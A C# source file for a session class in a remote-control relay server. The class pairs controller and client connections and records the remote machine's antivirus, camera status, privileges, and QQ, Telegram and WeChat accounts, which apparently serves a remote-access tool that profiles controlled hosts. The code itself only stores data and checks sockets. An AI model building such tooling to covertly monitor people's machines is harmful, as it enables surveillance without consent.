using System;
using System.Net.Sockets;
using System.Threading;

namespace RemoteControl.Relay
{
    /// <summary>
    /// 表示一个连接会话(客户端或控制端)
    /// </summary>
    public partial class ClientSession
    {
        private Socket _socket;
        private object _sendLock = new object();
        private readonly SemaphoreSlim _sendSemaphore = new SemaphoreSlim(1, 1);
        private volatile bool _closed;

        public string SessionId { get; private set; }
        public string ClientId { get; set; }
        public string CustomerId { get; set; } = "";
        public string InstallId { get; set; } = "";
        public string BuildId { get; set; } = "";
        public string Role { get; set; } = "";
        public string HostName { get; set; } = "";
        public string AppPath { get; set; } = "";
        public string OnlineAvatar { get; set; } = "";
        public string OnlineTime { get; set; } = "";
        public string UserName { get; set; } = "";
        public string LocalIP { get; set; } = "";
        public string OSVersion { get; set; } = "";
        public string Privilege { get; set; } = "";
        public string CameraStatus { get; set; } = "";
        public string Antivirus { get; set; } = "";
        public string OnlineQQ { get; set; } = "";
        public string TG { get; set; } = "";
        public string WX { get; set; } = "";
        public string UserStatus { get; set; } = "";
        public string Region { get; set; } = "";
        public string ISP { get; set; } = "";
        public string RemoteEndPoint { get; private set; }
        public DateTime LastSeenUtc { get; private set; }

        public ClientSession BoundController { get; set; }
        public ClientSession BoundClient { get; set; }

        public bool IsConnected
        {
            get
            {
                try
                {
                    if (_closed || _socket == null)
                        return false;
                    return !(_socket.Poll(1000, SelectMode.SelectRead) && _socket.Available == 0);
                }
                catch { return false; }
            }
        }

        public ClientSession(Socket socket)
        {
            _socket = socket;
            SessionId = Guid.NewGuid().ToString("N").Substring(0, 16);
            ClientId = SessionId;
            RemoteEndPoint = socket.RemoteEndPoint?.ToString() ?? "unknown";
            LastSeenUtc = DateTime.UtcNow;
        }
    }
}
